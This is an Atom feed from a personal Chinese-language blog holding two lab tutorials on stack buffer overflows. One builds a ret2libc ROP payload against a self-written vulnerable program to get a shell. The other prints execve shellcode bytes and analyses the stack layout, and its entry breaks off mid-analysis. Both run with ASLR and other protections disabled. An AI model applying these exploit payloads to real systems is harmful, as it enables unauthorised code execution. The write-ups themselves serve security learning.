<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
<generator uri="http://jekyllrb.com" version="3.6.0">Jekyll</generator>
<link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" />
<link href="http://localhost:4000/" rel="alternate" type="text/html" />
<updated>2017-11-14T22:59:46+08:00</updated>
<id>http://localhost:4000/</id>
<subtitle>NEVER GIVE UP</subtitle>
<author>
<name>void0red</name>
</author>
<entry>
<title>ret2libc</title>
<link href="http://localhost:4000/2017/11/11/ret2libc.html" rel="alternate" type="text/html" title="ret2libc" />
<published>2017-11-11T00:00:00+08:00</published>
<updated>2017-11-11T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/11/11/ret2libc</id>
<content type="html" xml:base="http://localhost:4000/2017/11/11/ret2libc.html">&lt;blockquote&gt;
  &lt;p&gt;this is a test not true&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;0x00准备&quot;&gt;0x00准备&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;本次实验的机器为&lt;code class=&quot;highlighter-rouge&quot;&gt;Ubuntu 16.04.2 LTS&lt;/code&gt;64位系统&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;需要关闭ASLR，&lt;code class=&quot;highlighter-rouge&quot;&gt;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/code&gt;，如果提示权限不够，可能需要用&lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt;提升权限&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt;编译需要关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;stack-protector&lt;/code&gt;，打开NX&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;需要&lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;peda&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;python2&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;ROPgadget or Ropper&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;攻击目标&lt;code class=&quot;highlighter-rouge&quot;&gt;test.c&lt;/code&gt;， &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -g -fno-stack-protector -o test test.c&lt;/code&gt;&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;unistd.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;23333&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x01分析&quot;&gt;0x01分析&lt;/h2&gt;

&lt;p&gt;测试程序很明显存在一个溢出的漏洞，但不能够写入一段&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode&lt;/code&gt;，然后运行，因为此时栈上的数据是不可执行的，也就是打开了NX，可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;checksec&lt;/code&gt;来查看程序的保护情况&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;幸运的是可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;ret2libc&lt;/code&gt;加上一点&lt;code class=&quot;highlighter-rouge&quot;&gt;ROP&lt;/code&gt;，劫持程序执行流，让它运行&lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x02确定返回地址的偏移量&quot;&gt;0x02确定返回地址的偏移量&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ pattern_create 100 test.txt
Writing pattern of 100 chars to filename &quot;test.txt&quot;
gdb-peda$ r &amp;lt; test.txt 
...
gdb-peda$ x/wx $rsp
0x7fffffffdd08:	0x44414128
gdb-peda$ pattern_offset 0x44414128
1145127208 found at offset: 24
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;获得返回地址的偏移量24&lt;/p&gt;

&lt;h2 id=&quot;0x03确定相关地址&quot;&gt;0x03确定相关地址&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ p system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x7ffff7a52390 &amp;lt;__libc_system&amp;gt;
gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b99d17 --&amp;gt; 0x68732f6e69622f ('/bin/sh')
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;因为关掉了&lt;code class=&quot;highlighter-rouge&quot;&gt;ASLR&lt;/code&gt;所以动态链接库的地址不会变化，可以直接使用&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数的地址&lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7a52390&lt;/code&gt;，字符串&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;的地址&lt;code class=&quot;highlighter-rouge&quot;&gt;0x7ffff7b99d17&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x04构造rop链&quot;&gt;0x04构造ROP链&lt;/h2&gt;

&lt;p&gt;还有一个需要解决的问题，怎样把&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;传到&lt;code class=&quot;highlighter-rouge&quot;&gt;system&lt;/code&gt;函数中去，在&lt;code class=&quot;highlighter-rouge&quot;&gt;linux64&lt;/code&gt;的系统上，一般使用寄存器传递参数，按照&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi,rsi,rdx,rcx,r8,r9&lt;/code&gt;的顺序传递，如果参数过多，再用栈传递参数&lt;/p&gt;

&lt;p&gt;所以需要一个简短的ROP链&lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt;，可以使用工具&lt;code class=&quot;highlighter-rouge&quot;&gt;Ropper&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;ROPgadget&lt;/code&gt;或者直接&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ROPgadget --binary test|grep pop|grep rdi
0x0000000000400603 : pop rdi ; ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;0x05编写payload&quot;&gt;0x05编写payload&lt;/h2&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'a'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;Q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x400603&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;Q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffff7b99d17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;Q'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7ffff7a52390&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'test.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'w'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;整个流程大概是这样的：&lt;/p&gt;

&lt;p&gt;返回地址被&lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi&lt;/code&gt;的地址覆盖，所以程序流被控制了，执行&lt;code class=&quot;highlighter-rouge&quot;&gt;pop rdi;ret&lt;/code&gt;，把栈顶弹出到&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;中，栈顶现在是&lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;的地址，然后它的地址自然被传递到了&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;寄存器中，接着执行&lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;，栈顶被弹入到&lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt;，也就是&lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;的地址被存入了&lt;code class=&quot;highlighter-rouge&quot;&gt;rip&lt;/code&gt;，现在调用&lt;code class=&quot;highlighter-rouge&quot;&gt;system()&lt;/code&gt;函数，参数存在&lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt;中&lt;/p&gt;

&lt;h2 id=&quot;0x06测试&quot;&gt;0x06测试&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ (cat test.txt;cat)|./test
23333

whoami
void0red
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;可以看到get到了&lt;code class=&quot;highlighter-rouge&quot;&gt;shell&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x07总结&quot;&gt;0x07总结&lt;/h2&gt;

&lt;p&gt;通过&lt;code class=&quot;highlighter-rouge&quot;&gt;ret2libc&lt;/code&gt;可以绕过&lt;code class=&quot;highlighter-rouge&quot;&gt;NX&lt;/code&gt;&lt;/p&gt;

</content>
<category term="pwn" />
<summary>  this is a test not true</summary>
</entry>
<entry>
<title>overflow</title>
<link href="http://localhost:4000/2017/11/09/overflow.html" rel="alternate" type="text/html" title="overflow" />
<published>2017-11-09T00:00:00+08:00</published>
<updated>2017-11-09T00:00:00+08:00</updated>
<id>http://localhost:4000/2017/11/09/overflow</id>
<content type="html" xml:base="http://localhost:4000/2017/11/09/overflow.html">&lt;blockquote&gt;
  &lt;p&gt;this is a test, not true&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;0x00准备&quot;&gt;0x00准备&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;本次实验的机器为&lt;code class=&quot;highlighter-rouge&quot;&gt;Ubuntu 16.04.2 LTS&lt;/code&gt;64位系统&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;需要关闭ASLR，&lt;code class=&quot;highlighter-rouge&quot;&gt;echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/code&gt;，如果提示权限不够，可能需要用&lt;code class=&quot;highlighter-rouge&quot;&gt;su&lt;/code&gt;提升权限&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;用&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc&lt;/code&gt;编译需要关闭&lt;code class=&quot;highlighter-rouge&quot;&gt;stack-protector&lt;/code&gt;，允许栈的执行权限&lt;code class=&quot;highlighter-rouge&quot;&gt;execstack&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;需要&lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;peda&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;python2&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;需要一串&lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode&lt;/code&gt;，本次使用&lt;/p&gt;

    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&lt;/code&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;一段计算地址的c语言程序&lt;code class=&quot;highlighter-rouge&quot;&gt;getenvaddr&lt;/code&gt;，源码在github可以找到，也可以选择下面的编译&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: %s &amp;lt;environment var&amp;gt; &amp;lt;target program name&amp;gt;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Get environment variable location */&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* Adjust for program name */&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s will be at %p&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;攻击目标&lt;code class=&quot;highlighter-rouge&quot;&gt;test.c&lt;/code&gt;，自己写的很简单&lt;/p&gt;

    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;unistd.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;23333&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;0x01分析&quot;&gt;0x01分析&lt;/h2&gt;

&lt;p&gt;通过观察很容易发现程序存在溢出漏洞，字符数组buf只申请了10个字节（10×1）的空间，而read函数却读入了40个字节。使用&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -g -fno-stack-protector -z execstack -o test test.c&lt;/code&gt;编译源文件，用&lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;调试程序&lt;/p&gt;

&lt;p&gt;查看main函数处的汇编代码：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ disassemble main
Dump of assembler code for function main:
   0x0000000000400566 &amp;lt;+0&amp;gt;:	push   rbp				;rbp入栈，保存堆栈帧
   0x0000000000400567 &amp;lt;+1&amp;gt;:	mov    rbp,rsp				;rsp存到rbp中，确定了新的堆栈帧
   0x000000000040056a &amp;lt;+4&amp;gt;:	sub    rsp,0x10				;rsp减16，栈顶变动，为buf开辟了栈空间
   0x000000000040056e &amp;lt;+8&amp;gt;:	lea    rax,[rbp-0x10]			;将栈顶的地址存到rax中
   0x0000000000400572 &amp;lt;+12&amp;gt;:	mov    edx,0x28				;将40存到edx中
   0x0000000000400577 &amp;lt;+17&amp;gt;:	mov    rsi,rax				;传递栈顶地址，rsi存储buf的开始地址
   0x000000000040057a &amp;lt;+20&amp;gt;:	mov    edi,0x0				;将0存到edi中
   0x000000000040057f &amp;lt;+25&amp;gt;:	call   0x400440 &amp;lt;read@plt&amp;gt;		;调用read函数
   0x0000000000400584 &amp;lt;+30&amp;gt;:	mov    edi,0x400624			
   0x0000000000400589 &amp;lt;+35&amp;gt;:	call   0x400430 &amp;lt;puts@plt&amp;gt;
   0x000000000040058e &amp;lt;+40&amp;gt;:	mov    eax,0x0
   0x0000000000400593 &amp;lt;+45&amp;gt;:	leave  
   0x0000000000400594 &amp;lt;+46&amp;gt;:	ret    
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;程序执行到调用read函数，&lt;code class=&quot;highlighter-rouge&quot;&gt;call&lt;/code&gt;指令会将下条指令的地址入栈，也就是&lt;code class=&quot;highlighter-rouge&quot;&gt;0x400584&lt;/code&gt;，作为返回地址，然后将程序控制权交给read函数。&lt;/p&gt;

&lt;p&gt;下面这张图是一般函数栈的构造：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/void0red/Pictures/master/blog/overflow_0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这里栈内大概是这个样子：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rbp					&amp;lt;- 高地址
[]		;空处4字节
buf[9]-buf[8]	;空出2字节
buf[7]-buf[4]
buf[3]-buf[0]
0x400584				&amp;lt;- 低地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;然后read函数读入数据，程序给buf变量实际分配了16字节，为了寻址的方便还有一部分作为保留，一定程度上避免了溢出的发生。&lt;/p&gt;

&lt;p&gt;尝试输入32字节的数据&lt;code class=&quot;highlighter-rouge&quot;&gt;0123456地址789abcdef0123456789abcdef&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gdb-peda$ run
0123456789abcdef0123456789abcdef
23333

Program received signal SIGSEGV, Segmentation fault.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;程序发生了溢出，并且停在了&lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;指令处，很容易发现&lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt;，&lt;code class=&quot;highlighter-rouge&quot;&gt;rbp&lt;/code&gt;处的值似乎都被输入覆盖了。&lt;/p&gt;

&lt;p&gt;所以read读取完发生了什么？此时栈相当于：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x400584				;返回地址  	 &amp;lt;- 高地址
rbp（main）
...					&amp;lt;-rbp
...
{buf
...
...}					&amp;lt;-rsp		&amp;lt;- 低地址
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

